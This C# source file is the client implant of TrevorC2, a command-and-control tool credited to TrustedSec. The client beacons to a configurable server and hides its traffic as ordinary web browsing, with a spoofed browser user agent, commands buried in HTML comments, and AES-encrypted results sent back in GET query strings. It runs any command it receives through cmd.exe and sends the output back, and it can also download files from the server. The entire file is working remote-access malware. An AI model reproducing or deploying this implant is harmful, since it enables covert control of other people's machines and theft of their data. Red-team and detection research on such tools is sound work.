using System;
using System.Linq;
using System.IO;

namespace TrevorC2Client
{
    class TrevorC2Client
    {
        /*
            TrevorC2 - legitimate looking command and control
            Written by: Dave Kennedy @HackingDave
            Website: https://www.trustedsec.com
            GIT: https://github.com/trustedsec
            C# Client written by Franci Sacer (@francisacer1)

            This is the client connection, and only an example. Refer to the readme
            to build your own client connection to the server C2 infrastructure.
        */

        // CONFIG CONSTANTS:

        const string SITE_URL = "http://127.0.0.1";
        const string ROOT_PATH_QUERY = "/";
        // THIS FLAG IS WHERE THE CLIENT WILL SUBMIT VIA URL AND QUERY STRING GET PARAMETER
        const string SITE_PATH_QUERY = "/images";
        // THIS IS THE QUERY STRING PARAMETER USED
        const string QUERY_STRING = "guid=";
        // STUB FOR DATA - THIS IS USED TO SLIP DATA INTO THE SITE, WANT TO CHANGE THIS SO ITS NOT STATIC
        const string STUB = "oldcss=";
        // time_interval is the time used between randomly connecting back to server, for more stealth, increase this time a lot and randomize time periods
        const int time_interval1 = 2;
        const int time_interval2 = 8;
        const int time_factor = 1000; // seconds
        // THIS IS OUR ENCRYPTION KEY - THIS NEEDS TO BE THE SAME ON BOTH SERVER AND CLIENT FOR APPROPRIATE DECRYPTION. RECOMMEND CHANGING THIS FROM THE DEFAULT KEY
        const string CIPHER = "Tr3v0rC2R0x@nd1s@w350m3#TrevorForget";

        // DO NOT CHANGE BELOW THIS LINE

        static Random rng = new Random();
        static System.Net.CookieContainer CookieContainer = new System.Net.CookieContainer();
        static string computerName = Environment.MachineName;

        static System.Security.Cryptography.AesManaged CreateAesManagedObject(byte[] key = null, byte[] IV = null)
        {
            var aesManaged = new System.Security.Cryptography.AesManaged
            {
                Mode = System.Security.Cryptography.CipherMode.CBC,
                Padding = System.Security.Cryptography.PaddingMode.PKCS7,
                BlockSize = 128,
                KeySize = 256
            };
            if (IV != null)
            {
                aesManaged.IV = IV;
            }
            if (key != null)
            {
                aesManaged.Key = key;
            }
            return aesManaged;
        }

        static string CreateAesKey()
        {
            var aesManaged = CreateAesManagedObject();
            var hasher = new System.Security.Cryptography.SHA256Managed();
            var toHash = System.Text.Encoding.UTF8.GetBytes(CIPHER);
            var hashBytes = hasher.ComputeHash(toHash);
            var final = Convert.ToBase64String(hashBytes);
            return final;
        }

        static string EncryptString(byte[] key, string unencryptedString)
        {
            var bytes = System.Text.Encoding.UTF8.GetBytes(unencryptedString);
            var aesManaged = CreateAesManagedObject(key);
            var encryptor = aesManaged.CreateEncryptor();
            var encryptedData = encryptor.TransformFinalBlock(bytes, 0, bytes.Length);
            var fullData = aesManaged.IV.Concat(encryptedData).ToArray();
            return Convert.ToBase64String(fullData);
        }

        static string DecryptString(byte[] key, string encryptedStringWithIV)
        {
            var bytes = Convert.FromBase64String(encryptedStringWithIV);
            byte[] IV = bytes.Take(16).ToArray();
            var aesManaged = CreateAesManagedObject(key, IV);
            var decryptor = aesManaged.CreateDecryptor();
            var unencryptedData = decryptor.TransformFinalBlock(bytes, 16, bytes.Length - 16);
            return System.Text.Encoding.UTF8.GetString(unencryptedData).Trim((char)0);
        }

        static int RandomInterval()
        {
            return rng.Next(time_interval1, time_interval2 + 1);
        }

        static System.Net.WebResponse InvokeTrevorRequest(string url)
        {
            System.Net.HttpWebRequest r = (System.Net.HttpWebRequest)System.Net.WebRequest.Create(url);
            r.CookieContainer = CookieContainer;
            r.Method = "GET";
            r.KeepAlive = false;
            r.UserAgent = "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
            r.Headers.Add("Accept-Encoding", "identity");
            System.Net.WebResponse resp = r.GetResponse();

            return resp;
        }

        static string InvokeTrevorRequestReadStream(string url)
        {
            var resp = InvokeTrevorRequest(url);
            var reqstream = resp.GetResponseStream();
            var sr = new System.IO.StreamReader(reqstream);
            string res = sr.ReadToEnd();
            reqstream.Dispose();

            return res;
        }

        static void InvokeTrevorRequestDownload(string url, string destination)
        {
            var resp = InvokeTrevorRequest(url);
            var reqstream = resp.GetResponseStream();
            System.IO.FileStream targetStream = new System.IO.FileStream(destination, FileMode.Create);
            byte[] buffer = new byte[1024];
            int size = reqstream.Read(buffer,0,buffer.Length);
            while (size > 0)
            {
                targetStream.Write(buffer, 0, size);
                size = reqstream.Read(buffer,0,buffer.Length);
            }

            targetStream.Flush();
            targetStream.Close();
            targetStream.Dispose();
            reqstream.Dispose();
        }

        static void ConnectTrevor()
        {
            while (true)
            {
                var time = RandomInterval();

                try
                {
                    var HOSTNAME = String.Format("magic_hostname={0}",computerName);
                    var key = CreateAesKey();
                    var SEND = EncryptString(Convert.FromBase64String(key), HOSTNAME);
                    var s = System.Text.Encoding.UTF8.GetBytes(SEND);
                    SEND = Convert.ToBase64String(s);

                    var resp = InvokeTrevorRequest(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + SEND);
                    break;
                }
                catch (Exception)
                {
                    Console.WriteLine(String.Format("[*] Cannot connect to {0}",SITE_URL));
                    Console.WriteLine(String.Format("[*] Trying again in {0} seconds...",time));
                    System.Threading.Thread.Sleep(time * time_factor);
                    continue;
                }
            }
        }

        static void Main(string[] args)
        {
            bool doexit = false;
            var RUN = "";
            ConnectTrevor();

            while (true)
            {
                var time = RandomInterval();

                try
                {
                    var res = InvokeTrevorRequestReadStream(SITE_URL + ROOT_PATH_QUERY);

                    var ENCRYPTEDSTREAM = res.Split('\n').Where(x => x.Contains(String.Format("<!-- {0}",STUB))).FirstOrDefault();
                    var ENCRYPTED = ENCRYPTEDSTREAM.Split(new string[] { String.Format("<!-- {0}",STUB) }, StringSplitOptions.None);
                    ENCRYPTED = ENCRYPTED[1].Split(new string[] { " --></body>" }, StringSplitOptions.None);
                    var key = CreateAesKey();
                    var DECRYPTED = DecryptString(Convert.FromBase64String(key), ENCRYPTED[0]);
                    if (DECRYPTED == "nothing")
                    {
                        System.Threading.Thread.Sleep(time * time_factor);
                    }
                    else
                    {
                        if (DECRYPTED.StartsWith(computerName))
                        {
                            doexit = false;
                            DECRYPTED = DECRYPTED.Split(new string[] { computerName + "::::" }, StringSplitOptions.None)[1];

                            if (DECRYPTED.ToLower().StartsWith("tc2"))
                            {
                                char[] delimiter = {' '};
                                String[] command = DECRYPTED.Split(delimiter, 3);
                                if (command[1].ToLower() == "download")
                                {
                                    string URL = SITE_URL + command[2];
                                    String[] FILENAME = new Uri(URL).Segments;
                                    string FILE = Path.Combine(Path.GetTempPath(), FILENAME[FILENAME.Length-1]);
                                    InvokeTrevorRequestDownload(URL,FILE);
                                    RUN = "Download of " + URL + " to " + FILE + " succeeded";
                                }
                                else if (command[1].ToLower() == "quit")
                                {
                                    doexit = true;
                                    RUN = "This session is terminated";
                                }
                                else
                                {
                                    RUN = "Unknown command";
                                }
                            }
                            else
                            {
                                var compiler = new System.Diagnostics.Process();
                                compiler.StartInfo.FileName = "cmd.exe";
                                compiler.StartInfo.Arguments = String.Format("/Q /c {0} 2>&1",DECRYPTED);
                                compiler.StartInfo.UseShellExecute = false;
                                compiler.StartInfo.RedirectStandardOutput = true;
                                compiler.Start();
                                RUN = compiler.StandardOutput.ReadToEnd();
                                compiler.WaitForExit();
                            }

                            if (RUN == "")
                            {
                                RUN = "No data has been returned, there is also no error on execution";
                            }

                            var BaseRUN = computerName + "::::";
                            RUN = BaseRUN + RUN;
                            var SEND = EncryptString(Convert.FromBase64String(key), RUN);
                            var s = System.Text.Encoding.UTF8.GetBytes(SEND);
                            SEND = Convert.ToBase64String(s);
                            string GETURL = QUERY_STRING + SEND;
                            if (GETURL.Length > 81920)
                            {
                                RUN = BaseRUN + "There was to much data to report back";
                                SEND = EncryptString(Convert.FromBase64String(key), RUN);
                                s = System.Text.Encoding.UTF8.GetBytes(SEND);
                                SEND = Convert.ToBase64String(s);
                                GETURL = QUERY_STRING + SEND;
                            }
                            var resp = InvokeTrevorRequest(SITE_URL + SITE_PATH_QUERY + "?" + GETURL);

                            if (doexit)
                            {
                                return;
                            }

                            System.Threading.Thread.Sleep(time * time_factor);
                        }
                    }
                }
                catch (Exception)
                {
                    Console.WriteLine(String.Format("[*] Cannot connect to {0}",SITE_URL));
                    Console.WriteLine(String.Format("[*] Trying again in {0} seconds...",time));
                    System.Threading.Thread.Sleep(time * time_factor);
                    ConnectTrevor();
                    continue;
                }
            }
        }
    }
}
